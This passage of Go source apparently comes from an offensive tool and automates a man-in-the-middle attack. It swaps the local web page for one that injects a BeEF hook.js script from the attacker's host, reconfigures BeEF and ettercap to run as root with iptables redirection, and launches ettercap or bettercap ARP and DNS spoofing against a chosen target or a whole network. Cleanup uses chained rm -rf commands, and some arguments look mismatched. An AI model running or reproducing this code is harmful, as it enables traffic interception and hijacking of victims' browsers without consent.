                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, utils.LHost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

            fmt.Printf("\n%s[*] %sLaunching browser & ettercap pleas weit ...\n", bcolors.Green, bcolors.Endc)
            time.Sleep(405 * time.Millisecond)

            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, utils.LHost)
            subprocess.Popen(`ettercap -TQi %s -M arp:remote -P dns_spoof  /%s// /%s//`, utils.IFace, utils.RHost, utils.Gateway)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dn`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

    case "all":
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)

            newString := fmt.Sprintf(`passwd: "%s"`,utils.BeefPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `=beef-xss`: `=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl daemon-reload`)
            }

            filePathO := "/etc/ettercap/etter.conf.bak_africana"
            if _, err := os.Stat(filePathO); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.conf": {
                        `ec_uid = 65534`: `ec_uid = 0`,
                        `ec_gid = 65534`: `ec_gid = 0`,
                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            filePathT := "/etc/ettercap/etter.dns.bak_africana"
            if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", utils.FakeDns, " A ", utils.LHost)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.dns": {
                        `# vim:ts=8:noexpandtab`: newString,
                     },
                }
            utils.Editors(filesToReplacements)
            }
            fileXPath := "/var/www/html/.Files"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, utils.LHost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

            fmt.Printf("\n%s[*] %sLaunching browser & ettercap pleas weit ...\n", bcolors.Green, bcolors.Endc)
            time.Sleep(405 * time.Millisecond)

            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, utils.LHost)
            subprocess.Popen(`ettercap -TQi %s -M arp:remote -P dns_spoof ///`, utils.IFace)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
    default:
        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, utils.NeMode, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
}

func BeefBettercap(NeMode, LHost, RHost, IFace, BeefPasswd, FakeDns, Gateway string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }

    switch strings.ToLower(utils.NeMode) {
    case "single":
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
            newString := fmt.Sprintf(`passwd: "%s"`,utils.BeefPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `=beef-xss`: `=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl daemon-reload`)
            }

            fileXPath := "/var/www/html/.Files"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, utils.LHost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

            fmt.Printf("\n%s[*] %sLaunching browser & bettercap pleas weit ...\n", bcolors.Green, bcolors.Endc)
            time.Sleep(405 * time.Millisecond)

            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, utils.LHost)
            subprocess.Popen(`bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active"`, utils.LHost, utils.IFace, utils.RHost)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; systemctl -l --no-pager status apache2.service beef-xss.service`)

    case "all":
        if _, err := exec.LookPath("beef-xss"); err != nil {
            fmt.Printf("\n%sBeef isn't installed, install it with 'sudo apt install beef-xss'%s\n", bcolors.BrightRed, bcolors.Endc)
            return
        }

        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)

            newString := fmt.Sprintf(`passwd: "%s"`,utils.BeefPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `=beef-xss`: `=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl daemon-reload`)
            }

            fileXPath := "/var/www/html/.Files"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, utils.LHost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

            fmt.Printf("\n%s[*] %sLaunching browser & bettercap pleas weit ...\n", bcolors.Green, bcolors.Endc)
            time.Sleep(405 * time.Millisecond)

            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, utils.LHost)
            subprocess.Popen(`bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active"`, utils.IFace)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
    default:
        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, utils.NeMode, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
}

func BeefKill(Spoofer, NeMode, LHost, RHost, IFace, BeefPasswd, FakeDns, Gateway string) {
    if utils.Spoofer == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }

    switch strings.ToLower(utils.Spoofer) {
    case "ettercap":
        BeefEttercap(utils.NeMode, utils.LHost, utils.RHost, utils.IFace, utils.BeefPass, utils.FakeDns, utils.Gateway)
    case "bettercap":
        BeefBettercap(utils.NeMode, utils.LHost, utils.RHost, utils.IFace, utils.BeefPass, utils.FakeDns, utils.Gateway)
    default:
        fmt.Printf("\n%s[!] %sInvalid required parameters utils.Spoofer: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, utils.Spoofer, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
}
